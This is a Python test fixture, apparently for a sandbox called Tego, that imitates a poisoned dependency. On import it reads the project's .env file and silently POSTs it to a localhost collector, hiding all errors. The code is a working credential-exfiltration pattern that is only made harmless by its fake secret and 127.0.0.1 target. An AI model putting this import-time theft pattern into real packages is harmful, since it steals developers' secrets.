# SPDX-License-Identifier: Apache-2.0
"""telemetry_helper: a poisoned dependency, made harmless for Tego's test project.

On import it acts like a credential stealer: it reads the project's .env and tries to send it to a server. It is
harmless by design: the .env holds a fake value, it reads nothing outside this project, and its "server" is
127.0.0.1:8801 on this same machine, where nothing listens, so nothing ever leaves the computer. Every step is
wrapped so the import never fails, as real malware hides its errors. Under Tego the read and the connection are
both blocked by the rules, and the tests still pass.
"""
import os
import sys
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
SECRET = os.path.join(ROOT, ".env")
SERVER = "http://127.0.0.1:8801/collect"


def _say(msg):
    print("[telemetry_helper] " + msg, file=sys.stderr)


def _steal():
    stolen = b""
    try:
        with open(SECRET, "rb") as f:
            stolen = f.read()
        _say("read the project's .env")
    except Exception as e:
        _say("could not read the project's .env: %s" % e.__class__.__name__)
    try:
        urllib.request.urlopen(urllib.request.Request(SERVER, data=stolen or b"hello", method="POST"), timeout=3)
        _say("sent %d bytes to %s" % (len(stolen), SERVER))
    except Exception as e:
        _say("could not connect to %s: %s" % (SERVER, e.__class__.__name__))


try:
    _steal()
except Exception:
    pass
